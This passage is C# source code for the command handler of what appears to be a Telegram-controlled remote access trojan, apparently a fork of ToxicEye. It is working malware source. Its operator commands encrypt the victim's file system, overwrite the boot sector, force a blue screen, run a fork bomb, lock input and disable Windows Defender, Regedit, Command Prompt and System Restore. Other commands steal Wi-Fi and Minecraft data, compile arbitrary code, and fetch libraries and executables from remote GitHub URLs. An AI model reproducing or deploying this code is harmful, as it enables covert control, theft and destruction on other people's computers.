                            telegram.sendText(string.Format("⛔ File \"{0}\" not found!", Path.GetFileName(path)));
                            break;
                        }
                        // Play
                        utils.PlayMusic(path);
                        
                        break;
                    }
                // AudioVolumeSet
                case "AUDIOVOLUMESET":
                    {
                        // Check if args exists
                        int volume;
                        try
                        {
                            volume = int.Parse(args[1]);
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <volume> (from 0 to 100) is required for /AudioVolumeSet");
                            break;
                        }
                        // Load dll'ls
                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/AudioSwitcher.AudioApi.dll");
                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/AudioSwitcher.AudioApi.CoreAudio.dll");
                        // Set
                        utils.AudioVolumeSet(volume);
                        // Response
                        telegram.sendText($"🔊 Audio volume set to {volume}%");
                        break;
                    }
                // AudioVolumeGet
                case "AUDIOVOLUMEGET":
                    {
                        // Load dll'ls
                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/AudioSwitcher.AudioApi.dll");
                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/AudioSwitcher.AudioApi.CoreAudio.dll");
                        // Get
                        double volume = utils.AudioVolumeGet();
                        // Response
                        telegram.sendText($"🔊 Audio volume is {volume}%");
                        break;
                    }

                // SetWallpaper <image>
                case "SETWALLPAPER":
                    {
                        // Check if args exists
                        string file;
                        try
                        {
                            file = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <file> is required for /SetWallpaper");
                            break;
                        }
                        // If file not exists
                        if (!File.Exists(file))
                        {
                            telegram.sendText(string.Format("⛔ Wallpaper \"{0}\" not found!", Path.GetFileName(file)));
                            break;
                        }
                        SystemParametersInfo(0x0014, 0, Path.GetFullPath(file), 0x0001);
                        telegram.sendText("🌃 Wallpaper set!");
                        break;
                    }
                // BlockInput <seconds>
                case "BLOCKINPUT":
                    {
                        // Check if args exists
                        string time;
                        try
                        {
                            time = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <file> is required for /SetWallpaper");
                            break;
                        }
                        // If not admin
                        if(!utils.IsAdministrator())
                        {
                            telegram.sendText("⛔ This function requires admin rights!");
                            break;
                        }
                        // Block
                        telegram.sendText($"🚧 Keyboard and mouse locked for {time} seconds");
                        BlockInput(true);
                        Thread.Sleep(Int32.Parse(time) * 1000);
                        BlockInput(false);
                        telegram.sendText("🚧 Keyboard and mouse are now unlocked");
                        break;
                    }
                // Monitor <on/off>
                case "MONITOR":
                    {
                        // Check if args exists
                        string state;
                        try
                        {
                            state = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <on/off/standby> is required for /Monitor");
                            break;
                        }
                        if(state == "off")
                        {
                            SendMessage((IntPtr)0xFFFF, 0x112, (IntPtr)0xF170, (IntPtr)(2));
                        } else if(state == "standby")
                        {
                            SendMessage((IntPtr)0xFFFF, 0x112, (IntPtr)0xF170, (IntPtr)(1));
                        } else
                        {
                            SendMessage((IntPtr)0xFFFF, 0x112, (IntPtr)0xF170, (IntPtr)(-1));
                        }
                        telegram.sendText($"📟 Monitor mode: {state} set");
                        break;
                    }
                // DisplayRotate <0,90,180,270>
                case "DISPLAYROTATE":
                    {
                        // Check if args exists
                        string degrees;
                        try
                        {
                            degrees = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <0, 90, 180, 270> is required for /DisplayRotate");
                            break;
                        }
                        utils.Display.Rotate(degrees);
                        telegram.sendText("📟 Display rotated");
                        break;
                    }
                // EncryptFileSystem
                case "ENCRYPTFILESYSTEM":
                    {
                        // Check if args exists
                        string key;
                        try
                        {
                            key = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <password> is required for /EncryptFileSystem");
                            break;
                        }
                        utils.EncryptFileSystem(key);
                        break;
                    }
                // DecryptFileSystem
                case "DECRYPTFILESYSTEM":
                    {
                        // Check if args exists
                        string key;
                        try
                        {
                            key = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <password> is required for /DecryptFileSystem");
                            break;
                        }
                        utils.DecryptFileSystem(key);
                        break;
                    }
                // ForkBomb
                case "FORKBOMB":
                    {
                        telegram.sendText("🚨 Preparing ForkBomb...");
                        Thread.Sleep(2000);
                        string[] apps = new string[5] {
                            "notepad",
                            "explorer",
                            "mspaint",
                            "calc",
                            "cmd"
                        };
                        while (true)
                        {
                            Random random = new Random();
                            int rand = random.Next(0, apps.Length);
                            string start = apps[rand] + ".exe";

                            Process process = new Process();
                            ProcessStartInfo startInfo = new ProcessStartInfo();
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            startInfo.FileName = start;
                            process.StartInfo = startInfo;
                            process.Start();
                        }
                    }
                // BSoD
                case "BSOD":
                    {
                        telegram.sendText("🚨 Preparing blue screen of death...");
                        Thread.Sleep(2000);
                        Boolean t1;
                        uint t2;
                        RtlAdjustPrivilege(19, true, false, out t1);
                        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                        break;
                    }
                // OverwriteBootSector
                case "OVERWRITEBOOTSECTOR":
                    {
                        telegram.sendText("💊 Warning! System will be destroyed! Run command /OverwriteBootSector_CONFIRM to continue.");
                        break;
                    }
                // OverwriteBootSector_CONFIRM
                case "OVERWRITEBOOTSECTOR_CONFIRM":
                    {
                        telegram.sendText("🚨 Trying overwrite boot sector...");
                        Thread.Sleep(2000);
                        utils.DestroySystem();
                        break;
                    }

                // Modded
                case "BEEP":
                    {
                        string frequencyHz, durationMs;
                        // Check if args exists
                        try
                        {
                            frequencyHz = args[1];
                            durationMs = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <frequencyHz> and <durationMs> are required for /Beep");
                            break;
                        }
                        Beep.PlayBeep(int.Parse(frequencyHz),int.Parse(durationMs));
                        break;
                    }
                case "CYCLE":
                    {
                        string target_object, durationMs;
                        // Check if args exists
                        try
                        {
                            target_object = args[1];
                            durationMs = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <target_object (in base64 u can encode this in https://www.base64encode.org/)> and <durationMs> are required for /Cycle");
                            break;
                        }
                        Cycle.CycleStart(target_object, int.Parse(durationMs));
                        break;
                    }
                case "TRAY":
                    {
                        string showorhide;
                        // Check if args exists
                        try { showorhide = args[1]; }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <Show or hide> is required for /Tray");
                            break;
                        }
                        switch (showorhide.ToLower())
                        {
                            case "show":
                                {
                                    IntPtr handle = FindWindow("Shell_TrayWnd", null);
                                    ShowWindow(handle, 1);
                                    break;
                                }
                            case "hide":
                                {
                                    IntPtr handle = FindWindow("Shell_TrayWnd", null);
                                    ShowWindow(handle, 0);
                                    break;
                                }
                        }
                        break;
                    }
            case "CHANGEDATETIME":
                 {
                     string year, month, day, hour, minute, second;
                     // Check if args exists
                     try
                     {
                         year = args[1];
                         month = args[2];
                         day = args[3];
                         hour = args[4];
                         minute = args[5];
                         second = args[6];
                     }
                     catch (IndexOutOfRangeException)
                     {
                         telegram.sendText("⛔ Arguments <year> <month> <day> <hour> <minute> <second> are required for /ChangeDateTime");
                         break;
                     }

                     try
                     {
                         DateTime newDateTime = new DateTime(
                             int.Parse(year),
                             int.Parse(month),
                             int.Parse(day),
                             int.Parse(hour),
                             int.Parse(minute),
                             int.Parse(second)
                         );
                         telegram.sendText($"🕒 Date and time changed to: {newDateTime}");
                     }
                     catch (Exception ex)
                     {
                         telegram.sendText($"⛔ Error in parsing date and time: {ex.Message}");
                     }

                     break;
                 }
                case "SETRANDOMCURPOS":
                    {
                        string durationMs;
                        // Check if args exists
                        try { durationMs = args[1]; }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <durationMs> is required for /SetRandomCurPos");
                            break;
                        }
                        SetRandomCurPos.Set(int.Parse(durationMs));
                        break;
                    }
                case "DIRORFILE":
                    {
                        string showorhide,path;
                        // Check if args exists
                        try {
                            showorhide = args[1];
                            path = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Arguments <Show/Hide> <path (in base64)> are required for /DirOrFile");
                            break;
                        }
                        switch (showorhide.ToLower())
                        {
                            case "show":
                                {
                                    HideOrUnhideDir.UnhideFileOrDirectory(path);
                                    break;
                                }
                            case "hide":
                                {
                                    HideOrUnhideDir.HideFileOrDirectory(path);
                                    break;
                                }
                        }
                        break;
                    }
                case "REGEDIT":
                    {
                        string enableordisable;
                        // Check if args exists
                        try { enableordisable = args[1]; }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <Enable or Disable> is required for /Regedit");
                            break;
                        }
                        switch (enableordisable.ToLower())
                        {
                            case "enable":
                                {
                                    Regedit.EnableRegedit();
                                    break;
                                }
                            case "disable":
                                {
                                    Regedit.DisableRegedit();
                                    break;
                                }
                        }
                        break;
                    }
                case "WINDEFENDER":
                    {
                        string enableordisable;
                        // Check if args exists
                        try { enableordisable = args[1]; }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <Enable or Disable> is required for /Windefender");
                            break;
                        }
                        switch (enableordisable.ToLower())
                        {
                            case "enable":
                                {
                                    WinDefend.Enable();
                                    break;
                                }
                            case "disable":
                                {
                                    WinDefend.Disable();
                                    break;
                                }
                        }
                        break;
                    }
                case "COMPILE":
                    {
                        string csorvb, code;
                        // Check if args exists
                        try
                        {
                            csorvb = args[1];
                            code = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <cs (or) vb> and <code (in base64 u can encode this in https://www.base64encode.org/)> are required for /Compile");
                            break;
                        }
                        switch (csorvb.ToLower())
                        {
                            case "cs":
                                {
                                    Compiler.CompileCsharp(code);
                                    break;
                                }
                            case "vb":
                                {
                                    Compiler.CompileVbNet(code);
                                    break;
                                }
                        }
                        break;
                    }
                case "GETSCRES":
                    {
                        Screen screen = Screen.PrimaryScreen;
                        telegram.sendText($"🖥 Screen Resolution: {screen.Bounds.Width}x{screen.Bounds.Height}");
                        break;
                    }
                case "WIFI_STEAL":
                    {
                        string folderPath;
                        // Check if args exists
                        try
                        {
                            folderPath = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <folderPath> (in base64 u can encode this in https://www.base64encode.org/) is required for /Wifi_Steal");
                            break;
                        }
                        Wifi_Steal.Steal(folderPath);
                        break;
                    }
                case "CMD":
                    {
                        string enableordisable;
                        // Check if args exists
                        try { enableordisable = args[1]; }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <Enable or Disable> is required for /Cmd");
                            break;
                        }
                        switch (enableordisable.ToLower())
                        {
                            case "enable":
                                {
                                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System", true))
                                    {
                                        if (key != null && key.GetValue("DisableCMD") != null)
                                        {
                                            key.DeleteValue("DisableCMD");
                                            telegram.sendText("✅ Command Prompt Enabled.");
                                        }
                                        else
                                        {
                                            telegram.sendText("❌ Command Prompt is already enabled.");
                                        }
                                    }
                                    break;
                                }
                            case "disable":
                                {
                                    using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                                    {
                                        if (key != null && key.GetValue("DisableCMD") != null && (int)key.GetValue("DisableCMD") == 1)
                                        {
                                            telegram.sendText("❌ Command Prompt is already disabled.");
                                        }
                                        else
                                        {
                                            key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
                                            telegram.sendText("✅ Command Prompt Disabled.");
                                        }
                                    }
                                    break;
                                }
                        }
                        break;
                    }
                case "SYSTEMRESTORE":
                    {
                        string enableordisable;
                        // Check if args exists
                        try { enableordisable = args[1]; }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <Enable or Disable> is required for /SystemRestore");
                            break;
                        }
                        switch (enableordisable.ToLower())
                        {
                            case "enable":
                                {
                                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"))
                                    {
                                        if (key != null && key.GetValue("DisableSR") != null && (int)key.GetValue("DisableSR") != 1)
                                        {
                                            key.DeleteValue("DisableSR");
                                            telegram.sendText("✅ System Restore Enabled.");
                                        }
                                        else
                                        {
                                            telegram.sendText("❌ System Restore is already enabled.");
                                        }
                                    }
                                    break;
                                }
                            case "disable":
                                {
                                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"))
                                    {
                                        if (key != null && key.GetValue("DisableSR") != null && (int)key.GetValue("DisableSR") == 1)
                                        {
                                            telegram.sendText("❌ System Restore is already disabled.");
                                        }
                                        else
                                        {
                                            key.SetValue("DisableSR", 1, RegistryValueKind.DWord);
                                            telegram.sendText("✅ System Restore Disabled.");
                                        }
                                    }
                                    break;
                                }
                        }
                        break;
                    }
                case "SCREENRESOLUTION":
                    {
                        int screenWidth = Screen.PrimaryScreen.Bounds.Width;
                        int screenHeight = Screen.PrimaryScreen.Bounds.Height;

                        telegram.sendText("🖥 Screen Resolution: " + screenWidth + "x" + screenHeight);
                        break;
                    }
                case "ISADMIN":
                    {
                        telegram.sendText(utils.IsAdministrator().ToString());
                        break;
                    }
                case "BUGREPORT":
                    {
                        string Title, MessageText;
                        // Check if args exists
                        try
                        {
                            Title = args[1];
                            MessageText = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <Title (in base64 u can encode this in https://www.base64encode.org/)> and <MessageText (in base64)> are required for /BugReport");
                            break;
                        }
                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/cisamu123/CyberEye/main/TelegramRAT/core/libs/BugReport.exe");
                        string arguments = $"{Title} {MessageText}";

                        ProcessStartInfo startInfo = new ProcessStartInfo
                        {
                            FileName = "BugReport.exe",
                            Arguments = arguments,
                        };

                        using (Process process = new Process())
                        {
                            process.StartInfo = startInfo;
                            process.Start();
                            process.WaitForExit();
                        }
                        break;
                    }
                case "MINECRAFT":
                    {
                        string saveScreenshots, cleanFolderAfterCollecting;
                        // Check if args exists
                        try
                        {
                            saveScreenshots = args[1].ToLower();
                            cleanFolderAfterCollecting = args[2].ToLower();
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <SaveScreenshots (yes or no)> and <CleanFolderAfterCollecting (yes or no)> are required for /Minecraft");
                            break;
                        }

                        bool saveScreenshotsB, cleanFolderAfterCollectingB;

                        if (!TryParseYesNoArgument(saveScreenshots, out saveScreenshotsB))
                        {
                            telegram.sendText("⛔ Wrong argument for SaveScreenshots, try again!");
                            break;
                        }

                        if (!TryParseYesNoArgument(cleanFolderAfterCollecting, out cleanFolderAfterCollectingB))
                        {
                            telegram.sendText("⛔ Wrong argument for CleanFolderAfterCollecting, try again!");
                            break;
                        }

                        Minecraft.SaveAll(saveScreenshotsB, cleanFolderAfterCollectingB);
                        break;
                    }

                    // Helper method to parse "yes" or "no" argument
                    bool TryParseYesNoArgument(string argument, out bool result)
                    {
                        switch (argument)
                        {
                            case "yes":
                                result = true;
                                return true;
                            case "no":
                                result = false;
                                return true;
                            default:
                                result = false;
                                return false;
                        }
                    }
                case "CAMLIST":
                    {
                        utils.webcamList();
                        break;
                    }
                // Unknown command
                default:
                    {
                        telegram.sendText("📡 Unknown command");
                        break;
                    }

            }
        }


    }
}
